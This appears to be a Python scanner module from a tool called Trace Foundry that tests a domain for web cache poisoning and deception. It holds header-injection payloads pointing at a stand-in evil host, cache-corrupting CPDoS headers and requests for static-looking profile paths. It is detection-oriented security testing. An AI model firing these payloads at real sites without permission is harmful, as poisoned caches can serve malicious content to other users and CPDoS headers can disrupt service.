"""
Trace Foundry V5 - Web Cache Poisoning / Deception
Header manipulation, CPDoS, cache key injection
"""
import urllib.request
import urllib.error
import re
from utils.display import section, ok, warn, info, bug_found

# Headers that may be used as cache keys but reflected in response
UNKEYED_HEADERS = [
    ("X-Forwarded-Host",     "evil.tracefoundry.com"),
    ("X-Host",               "evil.tracefoundry.com"),
    ("X-Forwarded-Server",   "evil.tracefoundry.com"),
    ("X-HTTP-Host-Override", "evil.tracefoundry.com"),
    ("Forwarded",            "host=evil.tracefoundry.com"),
    ("X-Original-URL",       "/admin"),
    ("X-Rewrite-URL",        "/admin"),
    ("X-Forwarded-Port",     "443"),
    ("X-Forwarded-Scheme",   "http"),
    ("X-Forwarded-Proto",    "http"),
    ("X-Cache-Key",          "tfv5poison"),
    ("Pragma",               "tfv5poison"),
    ("X-Custom-Header",      "tfv5poison"),
]

# CPDoS — headers that crash/corrupt cache
CPDOS_HEADERS = [
    {"Cache-Control": "no-store, no-cache, must-revalidate, max-age=0, s-maxage=0, proxy-revalidate, no-transform"},
    {"X-Forwarded-Host": "INVALID_HOST_!@#$"},
    {"X-HTTP-Method-Override": "INVALID"},
    {"Transfer-Encoding": "identity, chunked"},
]

CACHE_INDICATORS = [
    "cf-cache-status","x-cache","x-varnish","age","x-cdn",
    "x-fastly","surrogate-key","x-amz-cf-id","x-cache-hits",
]

class CachePoisonModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout

    def _fetch(self, url, extra_headers=None):
        h = {"User-Agent": "Mozilla/5.0 TraceFoundry/5.0"}
        if extra_headers:
            h.update(extra_headers)
        try:
            req = urllib.request.Request(url, headers=h)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body    = r.read(32768).decode("utf-8", errors="ignore")
                headers = {k.lower(): v for k, v in r.headers.items()}
                return body, r.status, headers
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            headers = {k.lower(): v for k, v in e.headers.items()}
            return body, e.code, headers
        except:
            return "", 0, {}

    def _is_cached(self, headers):
        for ind in CACHE_INDICATORS:
            if ind in headers:
                val = headers[ind].lower()
                if any(kw in val for kw in ["hit","cached","1","true","fresh"]):
                    return True, ind, headers[ind]
        return False, None, None

    def _test_header_injection(self, url):
        bugs = []
        # Baseline
        base_body, base_status, base_headers = self._fetch(url)
        if base_status == 0:
            return bugs

        cached, ind, val = self._is_cached(base_headers)
        if not cached:
            info(f"  No cache headers detected at {url} — skipping cache poison")
            return bugs

        info(f"  Cache detected: {ind}={val}")

        for header_name, header_value in UNKEYED_HEADERS:
            body, status, resp_headers = self._fetch(
                url, extra_headers={header_name: header_value})

            if not body:
                continue

            # Check if injected value is reflected
            if header_value.lower() in body.lower():
                bugs.append({
                    "type":     f"Web Cache Poisoning — {header_name} Reflected",
                    "severity": "HIGH",
                    "url":      url,
                    "header":   header_name,
                    "value":    header_value,
                    "evidence": f"Header value '{header_value}' reflected in response body",
                    "impact":   "Poisoned cache served to all users — XSS, redirect, or deface possible",
                })
                bug_found(f"Web Cache Poisoning — {header_name}", "HIGH", {
                    "URL":      url,
                    "Header":   header_name,
                    "Value":    header_value,
                    "Evidence": f"'{header_value}' reflected in response",
                    "Impact":   "Cache can be poisoned to serve malicious content to all users",
                })

            # Check if Host header in injected value affects response
            base_host = self.domain.lower()
            if header_name in ("X-Forwarded-Host","X-Host") and \
               header_value.lower() in body.lower() and \
               base_host not in body.lower().replace(header_value.lower(),""):
                bugs.append({
                    "type":     "Web Cache Poisoning — Host Override",
                    "severity": "HIGH",
                    "url":      url,
                    "header":   header_name,
                    "evidence": f"{header_name} value used in response (URL/link generation)",
                    "impact":   "Attacker can inject evil host into cached responses → open redirect/XSS",
                })

        return bugs

    def _test_cache_deception(self, url):
        """Test Web Cache Deception — /profile/nonexistent.css"""
        bugs = []
        deception_paths = [
            "/profile/x.css","/account/x.css","/dashboard/x.css",
            "/settings/x.css","/user/x.css",
            "/profile/x.jpg","/account/x.jpg",
        ]
        for path in deception_paths:
            full_url = f"https://{self.domain}{path}"
            body, status, headers = self._fetch(full_url)
            if status == 200 and body:
                if any(kw in body.lower() for kw in
                       ["email","username","account","profile","user_id","token"]):
                    bugs.append({
                        "type":     "Web Cache Deception",
                        "severity": "HIGH",
                        "url":      full_url,
                        "evidence": f"Sensitive user data returned for static-looking URL {path}",
                        "impact":   "Cache stores user-specific page at static URL — other users can access it",
                    })
                    bug_found("Web Cache Deception", "HIGH", {
                        "URL":      full_url,
                        "Evidence": f"User data at static-looking path",
                        "Impact":   "Cached user data accessible by anyone who hits same URL",
                    })
        return bugs

    def run(self):
        section("Web Cache Poisoning / Deception (CDN Header Injection)")
        all_bugs = []

        test_pages = ["/","/home","/index","/api","/dashboard","/profile"]
        for page in test_pages:
            for scheme in ["https","http"]:
                url = f"{scheme}://{self.domain}{page}"
                bugs = self._test_header_injection(url)
                all_bugs.extend(bugs)
                break

        deception_bugs = self._test_cache_deception("/")
        all_bugs.extend(deception_bugs)

        info(f"Cache poison scan done — {len(all_bugs)} findings")
        if not all_bugs:
            ok("No cache poisoning found ✓")
        return {"bugs": all_bugs}
